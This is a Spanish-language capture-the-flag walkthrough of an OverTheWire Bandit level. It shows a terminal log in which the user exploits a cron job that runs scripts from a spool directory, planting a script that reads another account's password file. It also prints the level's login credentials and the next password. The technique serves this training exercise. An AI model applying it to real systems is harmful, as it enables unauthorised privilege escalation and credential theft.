# Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
# Datos de acceso
bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
# Solución
```
bandit23@bandit:~$ ls /etc/cron.d/
cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root  e2scrub_all  otw-tmp-dir  sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/37183729
mkdir: cannot create directory ‘/tmp/37183729’: File exists
bandit23@bandit:~$ mkdir /tmp/37183729c/
bandit23@bandit:~$ cd /tmp/37183729c
bandit23@bandit:/tmp/37183729c$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/clave_tmp/password" > contra.sh
bandit23@bandit:/tmp/37183729c$ chmod 777 contra.sh
bandit23@bandit:/tmp/37183729c$ cat contra.sh
cat /etc/bandit_pass/bandit24 >> /tmp/clave_tmp/password
bandit23@bandit:/tmp/37183729c$ ls -la contra.sh
-rwxrwxrwx 1 bandit23 bandit23 57 Feb 27 02:29 contra.sh
bandit23@bandit:/tmp/37183729c$ touch password
bandit23@bandit:/tmp/37183729c$ chmod 666 password
bandit23@bandit:/tmp/37183729c$ ls -la password
-rw-rw-rw- 1 bandit23 bandit23 0 Feb 27 02:30 password
bandit23@bandit:/tmp/37183729c$ ls -la
total 408
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 27 02:30 .
drwxrwx-wt 496 root     root     405504 Feb 27 02:31 ..
-rwxrwxrwx   1 bandit23 bandit23     57 Feb 27 02:29 contra.sh
-rw-rw-rw-   1 bandit23 bandit23      0 Feb 27 02:30 password
bandit23@bandit:/tmp/37183729c$ cp contra.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/37183729c$ date
Tue Feb 27 02:31:55 AM UTC 2024
bandit23@bandit:/tmp/37183729c$ ls -la
total 408
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 27 02:30 .
drwxrwx-wt 498 root     root     405504 Feb 27 02:33 ..
-rwxrwxrwx   1 bandit23 bandit23     57 Feb 27 02:29 contra.sh
-rw-rw-rw-   1 bandit23 bandit23      0 Feb 27 02:30 password
bandit23@bandit:/tmp/37183729c$ ls -la
total 408
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 27 02:30 .
drwxrwx-wt 498 root     root     405504 Feb 27 02:33 ..
-rwxrwxrwx   1 bandit23 bandit23     57 Feb 27 02:29 contra.sh
-rw-rw-rw-   1 bandit23 bandit23      0 Feb 27 02:30 password
bandit23@bandit:/tmp/37183729c$ cat password
bandit23@bandit:/tmp/37183729c$ date
Tue Feb 27 02:35:52 AM UTC 2024
bandit23@bandit:/tmp/37183729c$ ls -la
total 408
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 27 02:30 .
drwxrwx-wt 501 root     root     405504 Feb 27 02:35 ..
-rwxrwxrwx   1 bandit23 bandit23     57 Feb 27 02:29 contra.sh
-rw-rw-rw-   1 bandit23 bandit23      0 Feb 27 02:30 password
bandit23@bandit:/tmp/37183729c$ cat contra.sh
cat /etc/bandit_pass/bandit24 >> /tmp/clave_tmp/password
bandit23@bandit:/tmp/37183729c$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/37183729c/password" > contra.sh
bandit23@bandit:/tmp/37183729c$ touch password
bandit23@bandit:/tmp/37183729c$ chmod 666 password
bandit23@bandit:/tmp/37183729c$ cp contra.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/37183729c$ date
Tue Feb 27 02:37:34 AM UTC 2024
bandit23@bandit:/tmp/37183729c$ ls
contra.sh  password
bandit23@bandit:/tmp/37183729c$ ls -la
total 408
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 27 02:30 .
drwxrwx-wt 501 root     root     405504 Feb 27 02:37 ..
-rwxrwxrwx   1 bandit23 bandit23     57 Feb 27 02:36 contra.sh
-rw-rw-rw-   1 bandit23 bandit23      0 Feb 27 02:37 password
bandit23@bandit:/tmp/37183729c$ ls -la
total 412
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 27 02:30 .
drwxrwx-wt 501 root     root     405504 Feb 27 02:38 ..
-rwxrwxrwx   1 bandit23 bandit23     57 Feb 27 02:36 contra.sh
-rw-rw-rw-   1 bandit23 bandit23     33 Feb 27 02:38 password
bandit23@bandit:/tmp/37183729c$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

```
# Notas
- con el comando cp podemos copiar un archivo a otro directorio
- 
# Referencia
